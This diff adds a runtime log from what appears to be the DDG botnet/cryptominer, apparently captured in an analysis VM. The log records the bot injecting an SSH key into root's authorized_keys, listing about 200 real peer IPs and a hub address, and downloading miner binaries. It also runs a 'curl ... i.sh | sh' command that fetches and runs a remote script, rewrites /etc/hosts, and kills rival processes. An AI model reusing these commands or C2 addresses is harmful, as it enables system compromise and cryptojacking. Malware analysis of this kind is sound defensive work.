@@ -1,0 +1,1547 @@
+nohup: 忽略输入
+I0615 12:27:41.691108   17737 backdoor.go:61] inject ssh key successfully
+I0615 12:27:41.693901   17737 guard.go:64] "/root/.ssh/authorized_keys": CREATE
+I0615 12:27:41.694000   17737 guard.go:73] accept
+I0615 12:27:41.694025   17737 guard.go:64] "/root/.ssh/authorized_keys": WRITE
+I0615 12:27:41.694085   17737 guard.go:73] accept
+I0615 12:28:41.691071   17737 mlist.go:43] create mlist(<MY_VM_IP>:8564) network success
+I0615 12:29:11.692729   17737 mlist.go:47] setalth in mlist network
+I0615 12:29:11.692817   17737 main.go:104] mlist listen on: <MY_VM_IP>:8564
+I0615 12:29:11.693382   17737 utils.go:154] Load seedStatic: 200
+I0615 12:29:11.694491   17737 utils.go:155] seedStatic: 103.45.109.122:7946|49.234.65.197:7946|137.116.129.93:7946|118.24.32.48:7946|202.55.234.20:7946|121.239.202.203:7946|119.193.43.80:7946|47.56.18.89:7946|106.52.172.59:7946|61.163.81.140:7946|220.73.119.211:7946|129.213.122.136:7946|132.148.144.117:7946|103.71.70.44:7946|1.180.2.170:7946|61.153.35.122:7946|113.96.44.206:7946|149.129.78.228:7946|129.28.76.63:7946|47.56.19.28:7946|106.12.22.23:7946|213.230.111.46:7946|49.235.242.131:7946|180.178.46.132:7946|103.16.231.107:7946|106.52.60.107:7946|154.209.4.112:7946|103.40.30.121:7946|39.96.30.71:7946|111.10.31.242:7946|39.108.145.45:7946|47.96.130.70:7946|103.76.84.125:7946|27.102.185.145:7946|103.193.188.12:7946|60.208.82.12:7946|125.91.216.123:7946|165.22.40.196:7946|129.211.113.61:7946|129.204.93.232:7946|185.12.7.62:7946|117.73.8.141:7946|123.206.18.36:7946|47.52.62.133:7946|149.129.107.67:7946|47.240.43.194:7946|118.24.70.76:7946|218.238.4.124:7946|47.98.167.119:7946|180.178.46.134:7946|47.92.93.213:7946|112.173.168.34:7946|129.211.126.134:7946|101.91.127.57:7946|119.27.179.82:7946|119.96.172.6:7946|49.232.13.12:7946|218.244.138.199:7946|47.244.19.141:7946|111.231.134.73:7946|111.47.15.193:7946|114.115.157.114:7946|123.207.64.215:7946|221.153.241.21:7946|119.195.211.10:7946|154.8.138.202:7946|123.103.11.71:7946|149.129.112.208:7946|182.92.219.84:7946|47.90.204.139:7946|47.240.45.245:7946|118.24.222.246:7946|222.174.255.10:7946|218.67.208.32:7946|103.1.209.144:7946|118.25.102.228:7946|211.227.153.90:7946|180.76.248.197:7946|119.9.76.107:7946|183.4.29.52:7946|183.131.217.86:7946|106.120.217.4:7946|106.13.138.238:7946|150.95.143.11:7946|202.152.37.108:7946|45.119.97.28:7946|36.152.8.130:7946|103.205.104.198:7946|121.183.18.38:7946|129.211.124.174:7946|182.254.199.74:7946|14.63.122.3:7946|103.15.232.244:7946|60.165.44.85:7946|60.168.222.116:7946|172.104.230.223:7946|154.85.34.69:7946|178.128.27.171:7946|198.1.81.46:7946|47.240.95.33:7946|154.92.22.112:7946|61.91.81.253:7946|115.220.3.99:7946|47.56.70.111:7946|196.61.32.43:7946|149.129.115.255:7946|49.51.153.55:7946|183.131.84.52:7946|165.227.29.251:7946|58.49.121.134:7946|103.56.149.29:7946|183.105.57.32:7946|123.206.199.212:7946|120.25.222.146:7946|39.107.126.239:7946|47.240.95.11:7946|154.221.31.241:7946|180.97.159.176:7946|150.217.80.90:7946|139.59.29.25:7946|121.40.232.222:7946|47.240.93.79:7946|222.186.52.175:7946|125.139.50.219:7946|14.38.252.218:7946|47.56.71.7:7946|123.206.63.71:7946|202.146.216.216:7947|121.189.194.112:7946|154.92.23.80:7946|47.52.93.164:7946|106.52.92.139:7946|103.55.26.128:7946|101.89.136.181:7946|149.129.109.141:7946|101.108.117.234:7946|106.12.40.103:7946|112.186.111.19:7946|103.100.158.56:7946|47.101.139.200:7946|47.52.228.202:7946|222.175.138.162:7946|118.24.90.72:7946|154.210.12.68:7946|111.177.18.16:7946|129.204.20.39:7946|47.52.104.123:7946|116.62.5.229:7947|118.24.127.139:7946|129.211.111.11:7946|152.136.143.234:7946|119.29.98.155:7946|106.13.58.6:7946|139.59.152.32:7946|223.113.4.252:7946|47.240.22.60:7946|154.92.22.196:7946|139.59.28.120:7947|103.66.219.104:7946|106.12.21.231:7946|212.224.124.98:7946|129.204.31.142:7946|106.75.218.102:7946|59.56.65.28:7946|49.235.149.31:7946|103.7.41.53:7946|118.25.44.62:7946|114.91.122.168:7946|139.199.229.198:7947|27.102.185.32:7946|140.143.30.27:7946|142.93.217.196:7946|139.59.80.170:7946|139.59.83.109:7946|107.182.187.34:7946|221.144.28.114:7946|60.191.99.129:7946|115.23.95.154:7946|119.27.166.234:7946|125.140.1.121:7946|129.211.118.15:7946|47.52.217.208:7946|121.41.43.218:7946|47.52.219.120:7946|154.92.22.137:7946|45.55.39.102:7946|103.45.111.82:7946|111.231.172.145:7946|192.241.142.107:7946|193.112.11.160:7946|218.74.52.138:7946|103.126.241.56:7946|112.220.73.44:7946|118.193.31.186:7946|111.67.202.140:7946|120.92.76.103:7946|149.129.114.135:7946|221.229.204.41:7946|152.136.175.43:7946|103.41.205.202:7946
+I0615 12:29:11.694910   17737 utils.go:169] Load seedDynamic: 0
+I0615 12:29:11.695420   17737 utils.go:170] seedDynamic: 
+I0615 12:36:31.693846   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:36:31.693910   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:36:31.693936   17737 report.go:46] empty baselist
+I0615 12:36:32.162191   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:36:32.178289   17737 cmd_sh.go:17] &{Base:{Id:1 Version:-1 Timeout:5s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Line:uptime}
+I0615 12:36:32.184373   17737 cmd_sh.go:17] &{Base:{Id:850 Version:-1 Timeout:10m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Line:echo -e "\n0.0.0.0 pastebin.com\n0.0.0.0 thyrsi.com\n0.0.0.0 tor2web.io\n0.0.0.0 gitee.com\n0.0.0.0 w.21-3n.xyz\n0.0.0.0 w.3ei.xyz\n0.0.0.0 aptgetgxqs3secda.onion.ly\n0.0.0.0 aptgetgxqs3secda.onion.pet\n0.0.0.0 aptgetgxqs3secda.tor2web.fyi\n0.0.0.0 aptgetgxqs3secda.onion.in.net\n0.0.0.0 rapid7cpfqnwxodo.tor2web.fyi\n0.0.0.0 rapid7cpfqnwxodo.onion.in.net\n0.0.0.0 rapid7cpfqnwxodo.onion.ly\n0.0.0.0 rapid7cpfqnwxodo.onion.pet\n0.0.0.0 intelbagjop7nzm5.tor2web.io\n0.0.0.0 intelbagjop7nzm5.d2web.org\n0.0.0.0 intelbagjop7nzm5.onion.in.net\n0.0.0.0 intelbagjop7nzm5.onion.glass\n0.0.0.0 intelbagjop7nzm5.onion.mn\n0.0.0.0 intelbagjop7nzm5.onion.sh\n0.0.0.0 intelbagjop7nzm5.onion.to\n" >> /etc/hosts}
+I0615 12:36:32.187541   17737 cmd_sh.go:17] &{Base:{Id:854 Version:-1 Timeout:2m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Line:(curl -fsSL http://103.219.112.66:8000/i.sh||wget -q -O- http://103.219.112.66:8000/i.sh) | sh}
+I0615 12:36:32.215255   17737 cmd_sh.go:17] &{Base:{Id:868 Version:-1 Timeout:1m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Line:sed -i "/ [jkl].ntp.direct/d" /etc/hosts && echo -e "\n202.182.108.88 j.ntp.direct\n119.9.76.107 l.ntp.direct" >> /etc/hosts}
+I0615 12:36:32.257727   17737 cmd_killer.go:19] &{Base:{Id:818 Version:-1 Timeout:1m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Expr:/tmp/ddgs.(3011|3012|3013|3014|3015|3016|3017|3018|3019|3020|3021|3022)}
+I0615 12:36:32.260464   17737 cmd_killer.go:49] /sbin/init splash
+I0615 12:36:32.260518   17737 cmd_killer.go:49] 
+I0615 12:36:32.260558   17737 cmd_killer.go:49] 
+I0615 12:36:32.260597   17737 cmd_killer.go:49] 
+I0615 12:36:32.260639   17737 cmd_killer.go:49] 
+I0615 12:36:32.260687   17737 cmd_killer.go:49] 
+I0615 12:36:32.260740   17737 cmd_killer.go:49] 
+I0615 12:36:32.260780   17737 cmd_killer.go:49] 
+I0615 12:36:32.260819   17737 cmd_killer.go:49] 
+I0615 12:36:32.260858   17737 cmd_killer.go:49] 
+I0615 12:36:32.260898   17737 cmd_killer.go:49] 
+I0615 12:36:32.260937   17737 cmd_killer.go:49] 
+I0615 12:36:32.260976   17737 cmd_killer.go:49] 
+I0615 12:36:32.261015   17737 cmd_killer.go:49] 
+I0615 12:36:32.261053   17737 cmd_killer.go:49] 
+I0615 12:36:32.261092   17737 cmd_killer.go:49] 
+I0615 12:36:32.261138   17737 cmd_killer.go:49] 
+I0615 12:36:32.261177   17737 cmd_killer.go:49] 
+I0615 12:36:32.261226   17737 cmd_killer.go:49] 
+I0615 12:36:32.261267   17737 cmd_killer.go:49] 
+I0615 12:36:32.261306   17737 cmd_killer.go:49] 
+I0615 12:36:32.261357   17737 cmd_killer.go:49] 
+I0615 12:36:32.261396   17737 cmd_killer.go:49] 
+I0615 12:36:32.261448   17737 cmd_killer.go:49] 
+I0615 12:36:32.261496   17737 cmd_killer.go:49] 
+I0615 12:36:32.261535   17737 cmd_killer.go:49] 
+I0615 12:36:32.261574   17737 cmd_killer.go:49] 
+I0615 12:36:32.261617   17737 cmd_killer.go:49] 
+I0615 12:36:32.261658   17737 cmd_killer.go:49] 
+I0615 12:36:32.261696   17737 cmd_killer.go:49] 
+I0615 12:36:32.261735   17737 cmd_killer.go:49] 
+I0615 12:36:32.261774   17737 cmd_killer.go:49] 
+I0615 12:36:32.261812   17737 cmd_killer.go:49] 
+I0615 12:36:32.261850   17737 cmd_killer.go:49] 
+I0615 12:36:32.261888   17737 cmd_killer.go:49] 
+I0615 12:36:32.261926   17737 cmd_killer.go:49] 
+I0615 12:36:32.261966   17737 cmd_killer.go:49] 
+I0615 12:36:32.262013   17737 cmd_killer.go:49] 
+I0615 12:36:32.262053   17737 cmd_killer.go:49] 
+I0615 12:36:32.265677   17737 cmd_killer.go:49] 
+I0615 12:36:32.265873   17737 cmd_killer.go:49] 
+I0615 12:36:32.265998   17737 cmd_killer.go:49] 
+I0615 12:36:32.266119   17737 cmd_killer.go:49] 
+I0615 12:36:32.266644   17737 cmd_killer.go:49] 
+I0615 12:36:32.266767   17737 cmd_killer.go:49] 
+I0615 12:36:32.267072   17737 cmd_killer.go:49] /lib/systemd/systemd-journald
+I0615 12:36:32.267536   17737 cmd_killer.go:49] /lib/systemd/systemd-udevd
+I0615 12:36:32.267880   17737 cmd_killer.go:49] 
+I0615 12:36:32.268002   17737 cmd_killer.go:49] 
+I0615 12:36:32.268400   17737 cmd_killer.go:49] /usr/sbin/cron -f
+I0615 12:36:32.268535   17737 cmd_killer.go:49] /usr/sbin/acpid
+I0615 12:36:32.268671   17737 cmd_killer.go:49] avahi-daemon: running [mingming.local]
+I0615 12:36:32.269013   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+I0615 12:36:32.269168   17737 cmd_killer.go:49] avahi-daemon: chroot helper
+I0615 12:36:32.269784   17737 cmd_killer.go:49] /usr/sbin/NetworkManager --no-daemon
+I0615 12:36:32.269975   17737 cmd_killer.go:49] /usr/lib/accountsservice/accounts-daemon
+I0615 12:36:32.270228   17737 cmd_killer.go:49] /usr/sbin/rsyslogd -n
+I0615 12:36:32.270414   17737 cmd_killer.go:49] /lib/systemd/systemd-logind
+I0615 12:36:32.270558   17737 cmd_killer.go:49] /usr/lib/policykit-1/polkitd --no-debug
+I0615 12:36:32.270869   17737 cmd_killer.go:49] /usr/sbin/lightdm
+I0615 12:36:32.271058   17737 cmd_killer.go:49] /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+I0615 12:36:32.267373   17737 cmd_killer.go:19] &{Base:{Id:875 Version:-1 Timeout:1m0s Result:{Map:{mu:{state:0 sema:0} read:{v:<nil>} dirty:map[] misses:0}} StartAt:1560573392 handler:0x8376410} Expr:/tmp/(6Tx3Wq|vTtHH|vTtHH1|HT8sUy71|HT8s716|SzdXM|Jonason)}
+I0615 12:36:32.271581   17737 cmd_killer.go:49] /sbin/agetty --noclear tty1 linux
+I0615 12:36:32.277266   17737 cmd_killer.go:49] lightdm --session-child 12 19
+I0615 12:36:32.277326   17737 cmd_killer.go:49] /usr/lib/rtkit/rtkit-daemon
+I0615 12:36:32.277375   17737 cmd_killer.go:49] /usr/lib/upower/upowerd
+I0615 12:36:32.277423   17737 cmd_killer.go:49] /usr/lib/colord/colord
+I0615 12:36:32.277473   17737 cmd_killer.go:49] /lib/systemd/systemd --user
+I0615 12:36:32.277532   17737 cmd_killer.go:49] (sd-pam)
+I0615 12:36:32.277597   17737 cmd_killer.go:49] /usr/bin/gnome-keyring-daemon --daemonize --login
+I0615 12:36:32.277645   17737 cmd_killer.go:49] /sbin/upstart --user
+I0615 12:36:32.278013   17737 cmd_killer.go:49] /usr/bin/VBoxClient --display
+I0615 12:36:32.278085   17737 cmd_killer.go:49] /usr/bin/VBoxClient --display
+I0615 12:36:32.278139   17737 cmd_killer.go:49] /usr/bin/VBoxClient --seamless
+I0615 12:36:32.278191   17737 cmd_killer.go:49] upstart-udev-bridge --daemon --user
+I0615 12:36:32.278240   17737 cmd_killer.go:49] dbus-daemon --fork --session --address=unix:abstract=/tmp/dbus-HUyAYIxVMy
+I0615 12:36:32.278290   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/hud/window-stack-bridge
+I0615 12:36:32.278338   17737 cmd_killer.go:49] upstart-dbus-bridge --daemon --system --user --bus-name system
+I0615 12:36:32.278387   17737 cmd_killer.go:49] upstart-dbus-bridge --daemon --session --user --bus-name session
+I0615 12:36:32.278447   17737 cmd_killer.go:49] upstart-file-bridge --daemon --user
+I0615 12:36:32.278585   17737 cmd_killer.go:49] /usr/bin/fcitx
+I0615 12:36:32.278639   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --config-file /usr/share/fcitx/dbus/daemon.conf
+I0615 12:36:32.278687   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/bamf/bamfdaemon
+I0615 12:36:32.278737   17737 cmd_killer.go:49] /usr/bin/fcitx-dbus-watcher unix:abstract=/tmp/dbus-lFSqr653c0,guid=89d5f08134b26815394140b85ce4d4c4 1649
+I0615 12:36:32.278791   17737 cmd_killer.go:49] /usr/lib/at-spi2-core/at-spi-bus-launcher
+I0615 12:36:32.278843   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
+I0615 12:36:32.278892   17737 cmd_killer.go:49] /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
+I0615 12:36:32.278940   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd
+I0615 12:36:32.278987   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-fuse /run/user/0/gvfs -f -o big_writes
+I0615 12:36:32.279038   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/notify-osd
+I0615 12:36:32.279087   17737 cmd_killer.go:49] gpg-agent --homedir /root/.gnupg --use-standard-socket --daemon
+I0615 12:36:32.279135   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/hud/hud-service
+I0615 12:36:32.279181   17737 cmd_killer.go:49] /usr/lib/unity-settings-daemon/unity-settings-daemon
+I0615 12:36:32.279229   17737 cmd_killer.go:49] /usr/lib/gnome-session/gnome-session-binary --session=ubuntu
+I0615 12:36:32.279279   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity/unity-panel-service
+I0615 12:36:32.279327   17737 cmd_killer.go:49] /usr/lib/dconf/dconf-service
+I0615 12:36:32.279374   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-messages/indicator-messages-service
+I0615 12:36:32.279421   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
+I0615 12:36:32.279468   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-power/indicator-power-service
+I0615 12:36:32.279519   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-datetime/indicator-datetime-service
+I0615 12:36:32.279567   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
+I0615 12:36:32.279617   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-sound/indicator-sound-service
+I0615 12:36:32.279665   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-printers/indicator-printers-service
+I0615 12:36:32.279712   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-session/indicator-session-service
+I0615 12:36:32.279850   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/indicator-application/indicator-application-service
+I0615 12:36:32.279901   17737 cmd_killer.go:49] /usr/lib/geoclue/geoclue-master
+I0615 12:36:32.279949   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-source-registry
+I0615 12:36:32.279997   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/ubuntu-geoip-provider
+I0615 12:36:32.280044   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory
+I0615 12:36:32.280095   17737 cmd_killer.go:49] /usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1
+I0615 12:36:32.289764   17737 cmd_killer.go:49] nm-applet
+I0615 12:36:32.289868   17737 cmd_killer.go:49] /usr/lib/unity-settings-daemon/unity-fallback-mount-helper
+I0615 12:36:32.289956   17737 cmd_killer.go:49] nautilus -n
+I0615 12:36:32.290032   17737 cmd_killer.go:49] /usr/bin/gnome-software --gapplication-service
+I0615 12:36:32.290277   17737 cmd_killer.go:49] compiz
+I0615 12:36:32.290865   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-udisks2-volume-monitor
+I0615 12:36:32.290941   17737 cmd_killer.go:49] /usr/lib/udisks2/udisksd --no-debug
+I0615 12:36:32.291018   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-mtp-volume-monitor
+I0615 12:36:32.291210   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-goa-volume-monitor
+I0615 12:36:32.291284   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-afc-volume-monitor
+I0615 12:36:32.291595   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfs-gphoto2-volume-monitor
+I0615 12:36:32.291765   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory-subprocess --factory local --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.Calendarx1982x2 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/Calendar/1982/2
+I0615 12:36:32.292282   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-calendar-factory-subprocess --factory contacts --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.Calendarx1982x3 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/Calendar/1982/3
+I0615 12:36:32.292417   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-addressbook-factory
+I0615 12:36:32.292552   17737 cmd_killer.go:49] fcitx-qimpanel
+I0615 12:36:32.292804   17737 cmd_killer.go:49] /usr/lib/evolution/evolution-addressbook-factory-subprocess --factory local --bus-name org.gnome.evolution.dataserver.Subprocess.Backend.AddressBookx2168x2 --own-path /org/gnome/evolution/dataserver/Subprocess/Backend/AddressBook/2168/2
+I0615 12:36:32.292938   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-trash --spawner :1.7 /org/gtk/gvfs/exec_spaw/0
+I0615 12:36:32.293374   17737 cmd_killer.go:49] 
+I0615 12:36:32.293503   17737 cmd_killer.go:49] zeitgeist-datahub
+I0615 12:36:32.293634   17737 cmd_killer.go:49] /bin/sh -c /usr/lib/i386-linux-gnu/zeitgeist/zeitgeist-maybe-vacuum; /usr/bin/zeitgeist-daemon
+I0615 12:36:32.293760   17737 cmd_killer.go:49] /usr/bin/zeitgeist-daemon
+I0615 12:36:32.291153   17737 cmd_killer.go:49] /sbin/init splash
+I0615 12:36:32.294678   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/zeitgeist-fts
+I0615 12:36:32.294944   17737 cmd_killer.go:49] /sbin/dhclient -d -q -sf /usr/lib/NetworkManager/nm-dhcp-helper -pf /var/run/dhclient-enp0s3.pid -lf /var/lib/NetworkManager/dhclient-60135289-a78e-332e-8738-3faf9606cf58-enp0s3.lease -cf /var/lib/NetworkManager/dhclient-enp0s3.conf enp0s3
+I0615 12:36:32.295075   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/deja-dup/deja-dup-monitor
+I0615 12:36:32.295320   17737 cmd_killer.go:49] deja-dup --prompt
+I0615 12:36:32.295450   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-network --spawner :1.7 /org/gtk/gvfs/exec_spaw/1
+I0615 12:36:32.295577   17737 cmd_killer.go:49] /usr/lib/gvfs/gvfsd-dnssd --spawner :1.7 /org/gtk/gvfs/exec_spaw/3
+I0615 12:36:32.295702   17737 cmd_killer.go:49] bash
+I0615 12:36:32.294807   17737 cmd_killer.go:49] 
+I0615 12:36:32.296533   17737 cmd_killer.go:49] /usr/lib/gnome-terminal/gnome-terminal-server
+I0615 12:36:32.296794   17737 cmd_killer.go:49] bash
+I0615 12:36:32.297030   17737 cmd_killer.go:49] /usr/bin/whoopsie -f
+I0615 12:36:32.297153   17737 cmd_killer.go:49] 
+I0615 12:36:32.297278   17737 cmd_killer.go:49] /usr/sbin/cupsd -l
+I0615 12:36:32.297396   17737 cmd_killer.go:49] 
+I0615 12:36:32.298381   17737 cmd_killer.go:49] /usr/lib/cups/notifier/dbus dbus://
+I0615 12:36:32.298513   17737 cmd_killer.go:49] wireshark-gtk
+I0615 12:36:32.298631   17737 cmd_killer.go:49] 
+I0615 12:36:32.298747   17737 cmd_killer.go:49] 
+I0615 12:36:32.298969   17737 cmd_killer.go:49] 
+I0615 12:36:32.299086   17737 cmd_killer.go:49] 
+I0615 12:36:32.299200   17737 cmd_killer.go:49] 
+I0615 12:36:32.299317   17737 cmd_killer.go:49] 
+I0615 12:36:32.299567   17737 cmd_killer.go:49] 
+I0615 12:36:32.299685   17737 cmd_killer.go:49] 
+I0615 12:36:32.300175   17737 cmd_killer.go:49] /usr/bin/dumpcap -n -i enp0s3 -y EN10MB -Z none
+I0615 12:36:32.300304   17737 cmd_killer.go:49] ./ddgs_4005.i686 -log_dir /tmp/ -alsologtostderr -v 3
+I0615 12:36:32.300422   17737 cmd_killer.go:49] 
+I0615 12:36:32.300547   17737 cmd_killer.go:49] tail -f ddg.log
+I0615 12:36:32.296653   17737 cmd_killer.go:49] 
+I0615 12:36:32.300932   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity-scope-home/unity-scope-home
+I0615 12:36:32.301670   17737 cmd_killer.go:49] /usr/bin/unity-scope-loader applications/applications.scope applications/scopes.scope commands.scope
+I0615 12:36:32.301796   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/unity-lens-files/unity-files-daemon
+I0615 12:36:32.301933   17737 cmd_killer.go:49] auditd
+I0615 12:36:32.302182   17737 cmd_killer.go:49] gdb asvfxg 25818
+I0615 12:36:32.301542   17737 cmd_killer.go:49] 
+I0615 12:36:32.302824   17737 cmd_killer.go:49] 
+I0615 12:36:32.302937   17737 cmd_killer.go:49] 
+I0615 12:36:32.303048   17737 cmd_killer.go:49] 
+I0615 12:36:32.303157   17737 cmd_killer.go:49] 
+I0615 12:36:32.303381   17737 cmd_killer.go:49] 
+I0615 12:36:32.303492   17737 cmd_killer.go:49] 
+I0615 12:36:32.303603   17737 cmd_killer.go:49] 
+I0615 12:36:32.303714   17737 cmd_killer.go:49] 
+I0615 12:36:32.304613   17737 cmd_killer.go:49] 
+I0615 12:36:32.304735   17737 cmd_killer.go:49] 
+I0615 12:36:32.304847   17737 cmd_killer.go:49] 
+I0615 12:36:32.304958   17737 cmd_killer.go:49] 
+I0615 12:36:32.305068   17737 cmd_killer.go:49] 
+I0615 12:36:32.305285   17737 cmd_killer.go:49] 
+I0615 12:36:32.305400   17737 cmd_killer.go:49] 
+I0615 12:36:32.305511   17737 cmd_killer.go:49] 
+I0615 12:36:32.305621   17737 cmd_killer.go:49] 
+I0615 12:36:32.305857   17737 cmd_killer.go:49] 
+I0615 12:36:32.306399   17737 cmd_killer.go:49] 
+I0615 12:36:32.306516   17737 cmd_killer.go:49] 
+I0615 12:36:32.306629   17737 cmd_killer.go:49] 
+I0615 12:36:32.306740   17737 cmd_killer.go:49] 
+I0615 12:36:32.306850   17737 cmd_killer.go:49] 
+I0615 12:36:32.307157   17737 cmd_killer.go:49] 
+I0615 12:36:32.307272   17737 cmd_killer.go:49] 
+I0615 12:36:32.307665   17737 cmd_killer.go:49] 
+I0615 12:36:32.307778   17737 cmd_killer.go:49] 
+I0615 12:36:32.307888   17737 cmd_killer.go:49] 
+I0615 12:36:32.307997   17737 cmd_killer.go:49] 
+I0615 12:36:32.308107   17737 cmd_killer.go:49] 
+I0615 12:36:32.308879   17737 cmd_killer.go:49] 
+I0615 12:36:32.308992   17737 cmd_killer.go:49] 
+I0615 12:36:32.309104   17737 cmd_killer.go:49] 
+I0615 12:36:32.309215   17737 cmd_killer.go:49] 
+I0615 12:36:32.309403   17737 cmd_killer.go:49] 
+I0615 12:36:32.309776   17737 cmd_killer.go:49] 
+I0615 12:36:32.309887   17737 cmd_killer.go:49] 
+I0615 12:36:32.309996   17737 cmd_killer.go:49] 
+I0615 12:36:32.310801   17737 cmd_killer.go:49] 
+I0615 12:36:32.310915   17737 cmd_killer.go:49] 
+I0615 12:36:32.311025   17737 cmd_killer.go:49] 
+I0615 12:36:32.311146   17737 cmd_killer.go:49] /lib/systemd/systemd-journald
+I0615 12:36:32.311268   17737 cmd_killer.go:49] /lib/systemd/systemd-udevd
+I0615 12:36:32.311494   17737 cmd_killer.go:49] 
+I0615 12:36:32.311605   17737 cmd_killer.go:49] 
+I0615 12:36:32.311729   17737 cmd_killer.go:49] /usr/sbin/cron -f
+I0615 12:36:32.311854   17737 cmd_killer.go:49] /usr/sbin/acpid
+I0615 12:36:32.312085   17737 cmd_killer.go:49] avahi-daemon: running [mingming.local]
+I0615 12:36:32.312627   17737 cmd_killer.go:49] /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+I0615 12:36:32.312778   17737 cmd_killer.go:49] avahi-daemon: chroot helper
+I0615 12:36:32.312904   17737 cmd_killer.go:49] /usr/sbin/NetworkManager --no-daemon
+I0615 12:36:32.313022   17737 cmd_killer.go:49] /usr/lib/accountsservice/accounts-daemon
+I0615 12:36:32.313343   17737 cmd_killer.go:49] /usr/sbin/rsyslogd -n
+I0615 12:36:32.313462   17737 cmd_killer.go:49] /lib/systemd/systemd-logind
+I0615 12:36:32.314109   17737 cmd_killer.go:49] /usr/lib/policykit-1/polkitd --no-debug
+I0615 12:36:32.314236   17737 cmd_killer.go:49] /usr/sbin/lightdm
+I0615 12:36:32.314356   17737 cmd_killer.go:49] /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+I0615 12:36:32.314476   17737 cmd_killer.go:49] /sbin/agetty --noclear tty1 linux
+I0615 12:36:32.314776   17737 cmd_killer.go:49] lightdm --session-child 12 19
+I0615 12:36:32.314895   17737 cmd_killer.go:49] /usr/lib/rtkit/rtkit-daemon
+I0615 12:36:32.315289   17737 cmd_killer.go:49] /usr/lib/upower/upowerd
+I0615 12:36:32.315408   17737 cmd_killer.go:49] /usr/lib/colord/colord
+I0615 12:36:32.315530   17737 cmd_killer.go:49] /lib/systemd/systemd --user
+I0615 12:36:32.315648   17737 cmd_killer.go:49] (sd-pam)
+I0615 12:36:32.316552   17737 cmd_killer.go:49] /usr/bin/gnome-keyring-daemon --daemonize --login
+I0615 12:36:32.316689   17737 cmd_killer.go:49] /sbin/upstart --user
+I0615 12:36:32.316817   17737 cmd_killer.go:49] /usr/bin/VBoxClient --display
+I0615 12:36:32.316935   17737 cmd_killer.go:49] /usr/bin/VBoxClient --display
+I0615 12:36:32.317157   17737 cmd_killer.go:49] /usr/bin/VBoxClient --seamless
+I0615 12:36:32.317276   17737 cmd_killer.go:49] upstart-udev-bridge --daemon --user
+I0615 12:36:32.317398   17737 cmd_killer.go:49] dbus-daemon --fork --session --address=unix:abstract=/tmp/dbus-HUyAYIxVMy
+I0615 12:36:32.317516   17737 cmd_killer.go:49] /usr/lib/i386-linux-gnu/hud/window-stack-bridge
+I0615 12:36:32.317761   17737 cmd_killer.go:49] upstart-dbus-bridge --daemon --system --user --bus-name system
+I0615 12:36:32.317887   17737 cmd_killer.go:49] upstart-dbus-bridge --daemon --session --user --bus-name session
